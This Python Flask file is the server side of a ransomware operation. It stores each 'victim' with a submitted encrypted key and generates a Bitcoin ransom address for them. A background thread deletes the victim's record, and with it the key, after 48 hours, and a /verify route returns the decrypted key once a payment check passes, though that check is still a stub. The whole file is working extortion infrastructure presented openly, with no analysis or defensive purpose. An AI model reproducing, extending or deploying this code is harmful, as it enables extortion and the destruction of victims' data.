import flask, base58, ecdsa, hashlib, binascii, time, os
from Crypto.Random import get_random_bytes
from flask import request, render_template, Response
from flask_sqlalchemy import SQLAlchemy
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Signature import PKCS1_v1_5
from threading import Thread
import json

#### Definitions ####

app = flask.Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///test.db'
db = SQLAlchemy(app)
expiring = []
with open('priv.txt', 'r') as f:
    private = RSA.importKey(binascii.unhexlify(f.read()))

#### Functions ####


def check_expiration():
    while True:
        for e in expiring:
            if round(time.time()) >= e['expiration']:
                victim.query.filter_by(unique_id=e['unique_id']).delete()
                db.session.commit()
            time.sleep(1)


def ripemd160(x):
    d = hashlib.new('ripemd160')
    d.update(x)
    return d


def generate():
    # generate private key , uncompressed WIF starts with "5"
    priv_key = os.urandom(32)
    fullkey = '80' + binascii.hexlify(priv_key).decode()
    sha256a = hashlib.sha256(binascii.unhexlify(fullkey)).hexdigest()
    sha256b = hashlib.sha256(binascii.unhexlify(sha256a)).hexdigest()
    WIF = base58.b58encode(binascii.unhexlify(fullkey + sha256b[:8]))

    # get public key , uncompressed address starts with "1"
    sk = ecdsa.SigningKey.from_string(priv_key, curve=ecdsa.SECP256k1)
    vk = sk.get_verifying_key()
    publ_key = '04' + binascii.hexlify(vk.to_string()).decode()
    hash160 = ripemd160(hashlib.sha256(binascii.unhexlify(publ_key)).digest()).digest()
    publ_addr_a = b"\x00" + hash160
    checksum = hashlib.sha256(hashlib.sha256(publ_addr_a).digest()).digest()[:4]
    publ_addr_b = base58.b58encode(publ_addr_a + checksum)
    return publ_addr_b.decode(),  WIF.decode()

#### routes ####


@app.route('/victim/<uniqueid>')
def show(uniqueid):
    vic = victim.query.filter_by(unique_id=uniqueid).first()
    if vic:
        return Response(json.dumps({'crypto_address': vic.crypto_address, 'expiration': vic.expiration}), mimetype='application/json', status=200)
    else:
        return Response('error', mimetype='text/html', status=403)
    # return render_template('show.html', victims=victims)


@app.route('/api/register', methods=['POST'])
def register():
    #try:
    encrypted_key = request.form['encrypted_key']
    unique_id = binascii.hexlify(get_random_bytes(8)).decode()
    address, private = generate()
    expiration = round(time.time()) + 172800
    expiring.append({'unique_id': unique_id, 'expiration': expiration})
    db.session.add(victim(unique_id=unique_id, crypto_address=address, crypto_private=private, expiration=expiration, encrypted_key=encrypted_key))
    db.session.commit()
    return Response(json.dumps({'unique_id': unique_id, 'crypto_address': address, 'expiration': expiration}), mimetype='application/json', status=200)
    #except:
        #return Response('Error', mimetype='text/html', status=403)

@app.route('/verify/<uniqueid>')
def verify(uniqueid):   # this is the verification process, as of now all requests are returned with the key,
    vic = victim.query.filter_by(unique_id=uniqueid).first()
    #### need to add verification stuff to check that the wallet has 0.002 btc####
    v = True
    if v:
        with open('priv.txt', 'r') as f:
            key = PKCS1_OAEP.new(private).decrypt(binascii.unhexlify(vic.encrypted_key)).decode()
            return Response(key, mimetype='text/html', status=200)
    else:
        return Response('error', mimetype='text/html', status=403)


#### Tables ####

class victim(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    unique_id = db.Column(db.String(64), nullable=False)
    crypto_address = db.Column(db.String(256), nullable=False)
    crypto_private = db.Column(db.String(256), nullable=False)
    expiration = db.Column(db.Integer(), nullable=False)
    encrypted_key = db.Column(db.String(256), nullable=False)

    def __repr__(self):
        return json.dumps({'crypto_address': self.crypto_address, 'expiration': self.expiration})


if __name__ == '__main__':
    Thread(target=check_expiration).start()
    db.create_all()